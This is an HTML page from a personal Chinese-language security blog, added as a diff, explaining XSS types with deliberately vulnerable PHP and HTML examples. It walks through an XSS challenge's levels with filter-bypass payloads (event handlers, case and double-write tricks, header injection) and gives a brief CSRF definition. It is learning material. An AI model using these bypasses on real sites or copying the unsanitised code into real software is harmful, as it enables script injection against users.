@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    XSS/CSRF |
+    
+    yichen&#39;s blog</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="yichen's blog" type="application/atom+xml">
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+<meta name="referrer" content="no-referrer" />
+  <article id="post-wq95oo" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+  
+    <h1 class="article-title" itemprop="name">
+      XSS/CSRF
+    </h1>
+  
+  
+
+
+
+
+            </header>
+            
+
+                
+                    <div class="article-meta">
+                        <a href="/2019/11/10/wq95oo/" class="article-date">
+  <time datetime="2019-11-10T05:34:38.000Z" itemprop="datePublished">2019-11-10</time>
+</a>
+                            
+                    </div>
+                    
+
+                        
+                            
+    <div class="tocbot"></div>
+
+
+
+
+
+                                
+
+                                    <div class="article-entry" itemprop="articleBody">
+                                        
+
+
+                                            
+
+                                                
+                                                                    <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585033816477-be3bfb2d-3d8d-42c2-abc5-509841f55784.png#align=left&display=inline&height=424&name=image.png&originHeight=848&originWidth=1186&size=371124&status=done&style=none&width=593" alt="image.png"></p>
+<p>最最基础的一个代码就是：<script>alert('xss')</script>，你甚至可以在本地建一个 txt，输入它，改成 html 之后用浏览器打开，就会发现弹了一个窗</p>
+<h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接引用了 name 参数，没有过滤，如果传参：<script>alert(/xss/)</script></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1565232396703-a84f1b57-7536-469a-9031-466d34ce9767.png#align=left&display=inline&height=517&name=image.png&originHeight=673&originWidth=1372&size=386438&status=done&style=none&width=1053.695967843751" alt="image.png"></p>
+<h2 id="持久型（存储型）"><a href="#持久型（存储型）" class="headerlink" title="持久型（存储型）"></a>持久型（存储型）</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$name = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">if</span> ($name)&#123;<span class="comment">//连接服务器</span></span><br><span class="line">$conn = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"yichen"</span>);</span><br><span class="line"><span class="comment">//检测连接</span></span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"connect fail"</span>.$conn-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//插入语句</span></span><br><span class="line">$sql_insert = <span class="string">"insert into yichen(name) values('$name')"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mysqli_query($conn, $sql_insert)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"insert  ok !"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $sql_insert . <span class="string">"&lt;br&gt;"</span> . mysqli_error($conn);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查询内容</span></span><br><span class="line">$sql_select = <span class="string">"select * from yichen"</span>;</span><br><span class="line">$result = mysqli_query($conn,$sql_select);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 输出每行数据</span></span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>. <span class="string">" - Name: "</span>. $row[<span class="string">"name"</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"0 results"</span>;</span><br><span class="line">&#125;&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"give me a name"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们看一下这条语句，它把我们通过 GET  传递的参数给存到了数据库里面<br>$sql_insert = “insert into yichen(name) values(‘$name’)”;</p>
+<p>之后又通过这条语句，把数据库里面的内容取出来，输出在页面上<br>echo “<br>“. “ - Name: “. $row[“name”];</p>
+<p>而在页面上的时候被错误的解析成了  javascript  代码执行了，就弹了一个窗</p>
+<p>来演试一下：在还没有传递  name  这个参数的时候，数据库里面是这样的：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585034398922-cbfcf8e7-16a9-4f4b-8c53-c236793649da.png#align=left&display=inline&height=222&name=image.png&originHeight=240&originWidth=379&size=104343&status=done&style=none&width=351" alt="image.png"></p>
+<p>只有一个  name  是 yichen 的记录</p>
+<p>当我们给他一个  name  值的时候：他把数据库的所有  name  都查询出来，并在页面上显示</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585034628898-b6453bca-b93e-4c93-98a7-b9537ba4aae6.png#align=left&display=inline&height=189&name=image.png&originHeight=280&originWidth=628&size=24273&status=done&style=shadow&width=425" alt="image.png"></p>
+<p>此时数据库里面的内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585034705749-4370d245-5f58-403d-92c0-11beb053606c.png#align=left&display=inline&height=177&name=image.png&originHeight=217&originWidth=372&size=11970&status=done&style=none&width=302" alt="image.png"></p>
+<p>当我们输入 <script>alert('xss')</script>  的时候会怎么样呐？</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585034894221-17de6fdc-038f-4d66-943a-c88066afe973.png#align=left&display=inline&height=277&name=image.png&originHeight=553&originWidth=1130&size=266482&status=done&style=none&width=565" alt="image.png"></p>
+<p>此时数据库的内容</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585034914857-e5ff1fe1-a764-4ae6-a0b4-25b08830838e.png#align=left&display=inline&height=153&name=image.png&originHeight=245&originWidth=596&size=18489&status=done&style=none&width=371" alt="image.png"></p>
+<p>可以发现，网页上并没有显示  <script>alert('xss')</script>  这是因为它已经被认为是代码了，我们可以看一下网页源代码：</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585035073053-f6995c31-a365-4cb7-ab88-285f53052ed1.png#align=left&display=inline&height=200&name=image.png&originHeight=282&originWidth=433&size=12036&status=done&style=none&width=308" alt="image.png"></p>
+<p>还有一点需要注意，此时他已经被存放在数据库里面，如果别人再去使用这个网页也会弹窗</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585035214755-698c007f-d08a-4018-bf9c-37da9c394d9e.png#align=left&display=inline&height=279&name=image.png&originHeight=557&originWidth=1127&size=266405&status=done&style=none&width=563.5" alt="image.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585035249171-878e5caf-e9b0-4be0-aceb-d8f354f910fb.png#align=left&display=inline&height=311&name=image.png&originHeight=330&originWidth=260&size=11491&status=done&style=stroke&width=245" alt="image.png"></p>
+<h2 id="DOM-型"><a href="#DOM-型" class="headerlink" title="DOM 型"></a>DOM 型</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  hello</span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.URL.match(<span class="regexp">/name=([^&amp;]*)/</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.write(<span class="built_in">unescape</span>(<span class="built_in">RegExp</span>.$<span class="number">1</span>));</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  hacker</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问：127.0.0.1/php/learn/xss/domXSS.html?name=<script>alert(/xss/)</script></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585035636659-7e76faa7-edf4-43cc-8f3e-3d78ba4cd1ea.png#align=left&display=inline&height=300&name=image.png&originHeight=540&originWidth=1121&size=248853&status=done&style=stroke&width=621" alt="image.png"></p>
+<h2 id="XSS-挑战赛"><a href="#XSS-挑战赛" class="headerlink" title="XSS 挑战赛"></a>XSS 挑战赛</h2><p><a href="http://test.ctf8.com/" target="_blank" rel="noopener">XSS 挑战赛</a></p>
+<h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>没有啥过滤，直接 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>有两处，第一处有 htmlspecialchars()函数，会把&lt;&gt;标签转义成 html 编码的格式<br>第二处，没有 htmlspecialchars()函数，但是需要逃逸&lt;””&gt;，所以是 <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>两处都有 htmlspecialchars()函数，没法使用<script></script>这样的啦，因为会被转义，所以使用新的方法<br><code>onclick=&#39;alert(/xss/)&#39;</code><br><code>onmouseover=&#39;alert(/xss/)&#39;</code></p>
+<p>onclick=’’  当点击时触发引号内的语句<br>onmouseover=’’  当鼠标经过时触发引号内的语句</p>
+<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>使用双引号闭合就可以了 <code>&quot;onmouseover=&#39;alert(1)&#39;</code></p>
+<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str2=str_replace(<span class="string">'&lt;script'</span>,<span class="string">'&lt;scr_ipt'</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">'on'</span>,<span class="string">'o_n'</span>,$str2);</span><br></pre></td></tr></table></figure>
+
+<p>对 &lt;srcipt  和  on  进行替换，在中间插上了一个 _<br>在第二个地方没有 html 转义，所以可以使用 <code>&quot;&gt; &lt;a href=&#39;javascript:alert(1)&#39;&gt;</code></p>
+<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br></pre></td></tr></table></figure>
+
+<p>过滤了上面这一些，但是没有转换大小写，可以使用大小写绕过：<br><code>&quot;OncLick=&#39;alert(1)&#39;</code></p>
+<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>把  on  过滤掉了，双写绕过 <code>&quot;oonnclick=&#39;alert(1)&#39;</code></p>
+<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'"'</span>,$str6);</span><br></pre></td></tr></table></figure>
+
+<p>对传入的转换成小写，同时匹配一些关键字进行替换<br><code>javascript:alert(1)</code></p>
+<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>要带着http://才行，直接后面注释一下，带着就可以了<br><code>javascript:alert(1)//http://yichen.com</code></p>
+<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line">&lt;input name=<span class="string">"t_link"</span>  value=<span class="string">"'.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_history"</span>  value=<span class="string">"'.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br><span class="line">&lt;input name=<span class="string">"t_sort"</span>  value=<span class="string">"'.$str33.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>源码中可以传递的参数是 keyword 跟 t_sort，对  keyword  进行了  htmlspecialchars()  函数操作，即进行了 html 编码，使用 t_sort  过滤掉了尖括号，想要使用的话需要构造出正常的 js</p>
+<p>传参：<code>t_sort=&quot;onclick=&quot;alert()&quot;type=&quot;text</code><br>带进去以后是：<code>&lt;input name=&quot;t_sort&quot; value=&quot;&quot;onclick=&quot;alert()&quot;type=&quot;text&quot; type=&quot;hidden&quot;&gt;</code></p>
+<h3 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h3><p>通过 HTTP_REFERER 获取到的值放在了 t_ref 里面</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line">&lt;input name=<span class="string">"t_ref"</span>  value=<span class="string">"'.$str33.'"</span> type=<span class="string">"hidden"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用  burp  抓包改  <code>Referer:&quot;onclick=&quot;alert(1)&quot;type=&quot;text</code></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1576385223776-95240426-db9d-40b7-bc8c-7f7b3767b582.png#align=left&display=inline&height=119&name=image.png&originHeight=116&originWidth=478&size=15201&status=done&style=none&width=492" alt="image.png"></p>
+<h3 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h3><p>改的是 User_Agent<br><code>User-Agent: &quot;onclick=&quot;alert(1)&quot;type=&quot;text</code></p>
+<h3 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h3><p>改的是  cookie 里面的值<br><code>Cookie: user=&quot;onclick=&quot;alert(1)&quot;type=&quot;text</code></p>
+<h3 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h3><p>崩了</p>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概念-3"><a href="#概念-3" class="headerlink" title="概念"></a>概念</h2><p>CSRF，全名 Cross Site Request Forgery，跨站请求伪造。很容易将它与 XSS 混淆，对于 CSRF，其两个关键点是跨站点的请求与请求的伪造，由于目标站无 token 或 referer 防御，导致用户的敏感操作的每一个参数都可以被攻击者获知，攻击者即可以伪造一个完全一样的请求以用户的身份达到恶意目的。</p>
+<h1 id="xss-练习"><a href="#xss-练习" class="headerlink" title="xss 练习"></a>xss 练习</h1><p><a href="https://xss.haozi.me/#/" target="_blank" rel="noopener">https://xss.haozi.me/#/</a></p>
+
+                                                                        
+                                    </div>
+                                    <footer class="article-footer">
+                                        <a data-url="http://yoursite.com/2019/11/10/wq95oo/" data-id="ckco53qbu00108ou9ao978gp9" class="article-share-link">
+                                            Share
+                                        </a>
+                                        
+                                    </footer>
+
+    </div>
+
+    
+        
+  <nav class="article-nav">
+    
+      <a href="/2019/11/10/igzkae/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer</strong>
+        <div class="article-nav-title">
+          
+            代码/命令执行
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/11/10/ezlu9t/" class="article-nav-link">
+        <strong class="article-nav-caption">Older</strong>
+        <div class="article-nav-title">文件包含</div>
+      </a>
+    
+  </nav>
+
+
+            
+
+                
+                    
+    <div class="vcomments" id="vcomments"></div>
+    
+<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
+
+        <script>
+            new Valine({
+                el: '#vcomments',
+                appId: '',
+                appKey: '',
+                notify: 'false',
+                verify: 'true',
+                avatar: 'mp',
+                pageSize: '10',
+                placeholder: '请输入...'
+            })
+        </script>
+        
+                        
+                            
+
+</article>
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+    <li><i class="fe fe-bookmark"></i> <span id="busuanzi_value_page_pv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2020 yichen&#39;s blog</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean" target="_blank" rel="noopener">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+<aside class="sidebar">
+  <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/head.png" alt="yichen&#39;s blog"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">主页</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">归档</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener">语雀</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="https://mp.weixin.qq.com/s/_xKmbanQddRoX2SoAcihWA" target="_blank" rel="noopener">关于</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+</aside>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+  
+<script src="/js/tocbot.min.js"></script>
+
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+
+<script src="/js/ocean.js"></script>
+
+
+</body>
+</html>
